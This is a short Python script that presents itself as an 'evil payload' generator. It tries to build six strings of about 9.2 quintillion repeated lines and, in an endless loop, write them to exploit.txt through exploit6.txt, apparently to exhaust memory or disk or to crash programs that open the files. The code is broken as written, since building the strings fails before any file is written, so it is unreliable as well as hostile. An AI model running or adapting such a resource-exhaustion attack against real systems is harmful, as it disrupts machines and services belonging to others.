buffer = "A\n" * 9223372036854775807
buffer2 = "B\n" * 9223372036854775807
buffer3 = "C\n" * 9223372036854775807

buffer4 = "D\n" * 9223372036854775807
buffer5 = "E\n" * 9223372036854775807
buffer6 = "F\n" * 9223372036854775807

payload = buffer
payload2 = buffer2
payload3 = buffer3
payload4 = buffer4
payload5 = buffer5
payload6 = buffer6

while True:
    try:
        f = open("exploit.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload))
        f.write(payload)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")
        
    try:
        f = open("exploit2.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload2))
        f.write(payload2)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")
    
    try:
        f = open("exploit3.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload3))
        f.write(payload3)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")

    try:
        f = open("exploit4.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload4))
        f.write(payload4)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")


    try:
        f = open("exploit5.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload5))
        f.write(payload5)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")


    try:
        f = open("exploit6.txt","w")
        print("[+] Creating %s bytes evil payload.." %len(payload6))
        f.write(payload6)
        f.close()
        print("[+] File created!")
    except:
        print("File cannot be created")